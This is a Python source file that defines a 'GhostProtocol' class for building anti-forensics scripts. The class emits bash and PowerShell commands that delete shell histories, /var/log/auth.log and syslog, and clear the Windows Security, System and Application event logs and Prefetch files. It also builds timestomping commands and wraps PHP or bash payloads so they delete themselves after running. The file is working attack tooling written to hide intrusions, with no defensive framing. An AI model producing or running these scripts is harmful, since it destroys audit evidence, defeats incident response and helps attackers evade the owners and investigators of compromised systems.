import base64

class GhostProtocol:
    @staticmethod
    def generate_wiper(os_type="linux"):
        """
        Generates Log Wiper script.
        """
        if os_type == "linux":
            return """
#!/bin/bash
# GHOST PROTOCOL: LOG WIPER
echo "[*] Engaging Ghost Protocol..."
unset HISTFILE
rm -f ~/.bash_history
rm -f ~/.zsh_history
rm -f /var/log/auth.log
rm -f /var/log/syslog
ln -sf /dev/null ~/.bash_history
history -c
echo "[+] Tracks Cleared."
"""
        elif os_type == "windows":
            return """
powershell -Command "Clear-EventLog -LogName Security";
powershell -Command "Clear-EventLog -LogName System";
powershell -Command "Clear-EventLog -LogName Application";
del C:\\Windows\\Prefetch\\* /Q
"""
        return ""

    @staticmethod
    def generate_timestomper(target_file, ref_file):
        """
        Generates command to match timestamps (Time Stomping).
        """
        # Linux: touch -r ref_file target_file
        return f"touch -r {ref_file} {target_file}"

    @staticmethod
    def wrap_self_destruct(payload_content, payload_type="php"):
        """
        Wraps a payload with self-destruct logic (Delete after execute).
        """
        if payload_type == "php":
            # Prepend/Append unlinking logic
            return f"<?php {payload_content} unlink(__FILE__); ?>"
        elif payload_type == "bash":
            return f"{payload_content}\nrm -- \"$0\""
            
        return payload_content
